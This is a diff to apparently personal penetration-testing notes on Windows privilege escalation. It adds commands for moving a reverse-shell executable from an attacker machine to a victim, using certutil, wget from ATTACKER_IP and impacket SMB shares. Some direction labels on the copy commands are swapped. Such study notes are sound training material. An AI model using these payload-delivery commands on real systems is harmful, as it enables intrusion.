@@ -17,13 +17,15 @@ Windows Privilege Escalation Techniques
 - Transfer exe file from attacker machine to victim after initial connection.
     * `python3 -m http.server 80` at the attacker machine file directory.
     * `certutil -urlcache -f http://10.17.11.201/reverse_4444.exe shell.exe` to download the exe file at the victim machine through reverse shell.
+    * or `wget http://ATTACKER_IP:8000/revshell.exe -O revshell.exe`
 - Transfer exe file through SMBv1 Protocole.
     - On Windows to start the SMBv1 service:
         * `Enable-WindowsOptionalFeature -Online -FeatureName "SMB1Protocol-Client" -All` In PowerShell with administrator privileges.
     - On Kali, in the same directory as reverse.exe:
         * `sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .`
     - On Windows (update the IP address with your Kali IP):
-        * `copy \\10.10.10.10\kali\reverse.exe C:\PrivEsc\reverse.exe`
+        * `copy \\10.10.10.10\kali\reverse.exe C:\PrivEsc\reverse.exe` from windows to linux(Attacker_machine).
+	* `copy C:\PrivEsc\reverse.exe \\10.17.11.201\kali\reverse.exe` from linux to windows
 
 ### Windows Privilege Escalation enumeration Tools:
     - `winPEASany.exe`
